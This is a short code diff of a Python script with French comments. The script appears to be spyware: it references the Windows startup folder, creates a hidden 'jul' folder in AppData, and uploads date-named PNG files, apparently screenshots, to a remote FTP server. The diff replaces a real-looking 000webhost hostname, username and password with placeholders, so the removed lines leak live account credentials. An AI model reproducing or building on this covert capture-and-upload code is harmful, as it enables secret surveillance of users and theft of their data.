@@ -17,7 +17,7 @@ startup = winshell.startup()
 
 script_location = os.path.split(os.path.realpath(sys.argv[0]))[0]
 USER_NAME = getpass.getuser()
-filename = os.path.basename(__file__)
+filename = os.path.splitext(os.path.basename(__file__))[0]
 
 #créer un dossier jul dans le appdata de la machine
 dirName = f'{appdata}/jul'
@@ -42,7 +42,7 @@ def jul():
         jul = Path(rf'{appdata}\jul\%s.png' % date)
         
         #Connexion ftp blablabla upload du fichier
-        session = ftplib.FTP('files.000webhost.com','loutchocsgo','allahwakbar')
+        session = ftplib.FTP('serveur','user','password')
         
         file = open(jul,'rb')
         session.storbinary(f'STOR {jul.name}', file)
